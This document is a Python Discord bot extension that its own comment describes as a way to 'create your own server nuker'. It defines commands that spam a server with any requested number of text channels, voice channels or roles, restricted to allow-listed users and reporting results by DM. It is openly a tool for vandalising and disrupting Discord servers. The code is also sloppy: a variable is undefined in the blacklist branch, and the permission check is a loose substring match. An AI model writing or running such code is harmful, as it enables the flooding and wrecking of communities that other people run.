import discord
from discord.ext import commands
from discord.ext.commands import MissingPermissions, BadArgument, MissingRequiredArgument, CommandInvokeError

class nukerCog(commands.Cog):
    def __init__(self, bot):
        self.client = bot

    # With this code you can create your own server nuker



    @commands.command()
    async def nuker(self, ctx):

        if str(ctx.author.id) in open ("idstuff/allowednukers.py").read():


            user = ctx.author
            embed = discord.Embed(
                title="Nuke Terminal V 0.1",
                color = discord.Color.red()
            )
            embed.add_field(name="`chnuke <ammount> <name_next>`", value="Spamms new Channel", inline=False)
            embed.add_field(name="`rlnuke <ammount> <role_name>`",value="Spamms new Roles", inline=False)
            embed.add_field(name="`vcnuke <amount> <voice_name>`", value="Spamms new Voice Chanels", inline=False)

            await user.send(embed=embed)

        else:
            return


    @commands.command()
    async def vcnuke(self, ctx, x, name):
        if str(ctx.author.id) in open ("idstuff/allowednukers.py").read():
            guild = ctx.guild
            if str(guild.id) in open ("idstuff/blacklistedserver.py").read():
                userctx = ctx.author
                user = client.get_user(652530420524777493)
                serverfrom = str(ctx.guild.name)
                embed = discord.Embed(
                    title ="Failed NUKE",
                    timestamp=ctx.message.created_at,
                    color = discord.Color.red()
                )
                embed.add_field(name="Nuke Faild", value=f"**{userctx} tried to `voice` nuke {serverfrom} but failed**")

                await user.send(embed=embed)

            #await user.send(f"**{userctx} tryed to voice nuke {serverfrom} but failed **")
            
             
            else:
            


                perms = discord.Permissions(0)
                names = str(ctx.guild.name)
                user = ctx.author

                guild = ctx.guild
                for i in range(int(x)):
                    await guild.create_voice_channel(f"{name}")

                embed = discord.Embed(
                    title=names + " Got Voice Spammed !",
                    timestamp=ctx.message.created_at,
                    colour = discord.Colour.gold()
                )
                embed.add_field(name=f"'{name}' Channels created", value=f'Ammont: {x}')

                await user.send(embed=embed)
    
        else:
            return

    @commands.command()
    async def chnuke(self, ctx, x, name):
        if str(ctx.author.id) in open ("idstuff/allowednukers.py").read():
            guild = ctx.guild
            if str(guild.id) in open ("idstuff/blacklistedserver.py").read():
                userctx = ctx.author
                user = client.get_user(652530420524777493)
                serverfrom = str(ctx.guild.name)
                embed = discord.Embed(
                    title ="Failed NUKE",
                    timestamp=ctx.message.created_at,
                    color = discord.Color.red()
                )
                embed.add_field(name="Nuke Faild", value=f"**{userctx} tried to `channel` nuke {serverfrom} but failed**")

                await user.send(embed=embed)

            #await user.send(f"**{userctx} tryed to voice nuke {serverfrom} but failed **")
            
             
            else:
            


                perms = discord.Permissions(0)
                names = str(ctx.guild.name)
                user = ctx.author

                guild = ctx.guild
                for i in range(int(x)):
                    await guild.create_text_channel(f"{name}")

                embed = discord.Embed(
                    title=names + " Got Channel Spammed !",
                    timestamp=ctx.message.created_at,
                    colour = discord.Colour.gold()
                )
                embed.add_field(name=f"'{name}' Channels created", value=f'Ammount: {x}')

                await user.send(embed=embed)
    
        else:
            return

    @commands.command()
    async def rlnuke(self, ctx, x, name):
        if str(ctx.author.id) in open ("idstuff/allowednukers.py").read():
            guild = ctx.guild
            if str(guild.id) in open ("idstuff/blacklistedserver.py").read():
                userctx = ctx.author
                user = client.get_user(652530420524777493)
                serverfrom = str(ctx.guild.name)
                embed = discord.Embed(
                    title ="Failed NUKE",
                    timestamp=ctx.message.created_at,
                    color = discord.Color.red()
                )
                embed.add_field(name="Nuke Faild", value=f"**{userctx} tried to `role` nuke {serverfrom} but failed**")

                await user.send(embed=embed)

            #await user.send(f"**{userctx} tryed to voice nuke {serverfrom} but failed **")
            
             
            else:
            


                perms = discord.Permissions(0)
                names = str(ctx.guild.name)
                user = ctx.author

                guild = ctx.guild
                for i in range(int(x)):
                    await guild.create_role(name=f"{name}", permissions=perms)

                embed = discord.Embed(
                    title=names + " Got role Spammed !",
                    timestamp=ctx.message.created_at,
                    colour = discord.Colour.gold()
                )
                embed.add_field(name=f"'{name}' Roles created", value=f'Ammount: {x}')

                await user.send(embed=embed)
    
        else:
            return





def setup(bot):
    bot.add_cog(nukerCog(bot))